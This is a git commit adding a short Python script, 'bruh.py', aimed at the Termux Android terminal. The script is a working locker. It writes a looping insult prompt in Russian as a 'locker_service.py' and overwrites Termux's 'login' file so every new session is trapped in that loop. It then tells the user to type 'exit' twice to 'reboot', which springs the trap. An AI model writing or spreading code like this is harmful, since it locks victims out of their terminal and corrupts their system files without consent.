cc464508760c048ce5a9e4e9ebc31f7494719aae
Trilsonprt <102162763+Trilsonprt@users.noreply.github.com>
2022-05-16 19:19:58 +0500

    Add files via upload

---
+++ bruh.py
@@ -0,0 +1,23 @@
+import os
+
+file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
+file.write("""print('''  _____                                     
+╭━━╮╱╱╱╱╱╭╮
+┃╭╮┃╱╱╱╱╱┃┃
+┃╰╯╰┳━┳╮╭┫╰━╮
+┃╭━╮┃╭┫┃┃┃╭╮┃
+┃╰━╯┃┃┃╰╯┃┃┃┃
+╰━━━┻╯╰━━┻╯╰╯
+
+
+''')
+while True:
+	a = input(' Ебать ты лох. @HOME_PROJECTS_VIP')
+""")
+file.close()
+os.system('chmod +x /data/data/com.termux/files/usr/bin/locker_service.py')
+
+file = open('/data/data/com.termux/files/usr/bin/login', 'w')
+file.write('python /data/data/com.termux/files/usr/bin/locker_service.py')
+file.close()
+print(' Напиши exit (дважды) для перезагрузки')
